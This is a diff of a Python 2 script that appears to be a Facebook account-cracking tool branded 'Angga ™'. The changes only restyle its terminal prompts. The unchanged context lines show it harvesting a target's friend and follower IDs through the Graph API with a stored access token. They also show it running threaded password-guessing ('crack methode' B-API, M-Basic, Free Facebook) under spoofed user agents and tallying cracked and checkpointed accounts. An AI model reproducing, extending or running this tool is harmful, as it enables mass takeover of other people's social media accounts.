@@ -155,7 +155,7 @@ def menu():
 		print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check results RAKA_AMANDA OK")
 		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check results RAKA_AMANDA CP")
 		print(" ")
-		cek = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Option  : ")
+		cek = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Option  : \033[1;92m")
 		if cek =="":
 			menu()
 		elif cek == "1":
@@ -204,7 +204,7 @@ def publik():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id       : ")
+	idt = raw_input("\033[1;93m[\033[1;92m•\033[1;97m]\033[1;97m Target Id       : \033[1;92m")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
@@ -212,7 +212,7 @@ def publik():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
-	print("\033[1;93m◍➤\033[1;97m Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
+	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
 	global token
@@ -220,7 +220,7 @@ def follower():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id       : ")
+	idt = raw_input("[\033[1;93m•\033[1;97m] Target Id       : \033[1;92m")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
@@ -228,7 +228,7 @@ def follower():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
-	print("\033[1;93m◍➤\033[1;97m Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
+	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
 	global token
@@ -249,14 +249,14 @@ def massal():
 				id.append(uid+"<=>"+nama)
 		except KeyError:
 			print("\033[1;93m◍➤\033[1;97m  Ids friend list Is not public")
-	print("\033[1;93m◍➤\033[1;97m Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
+	print("[\033[1;93m•\033[1;97m] Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
-	print("\033[1;93m◍➤\033[1;97m Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
+	print("[\033[1;93m•\033[1;97m] Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
 	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
-	method = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mOption : ")
+	method = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mOption : \033[1;92m")
 	if method == "":
 		menu()
 	elif method == "1":
@@ -267,14 +267,14 @@ def method():
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;93m◍➤\033[1;97m Do you choose manual passwords ? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
+		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwords ? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;93m◍➤[\033[1;97m Do you choose manual passwords ? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
+		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwords ? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -318,7 +318,7 @@ def bapi(user):
                 ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r[\033[1;92mR\033[1;97m] \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
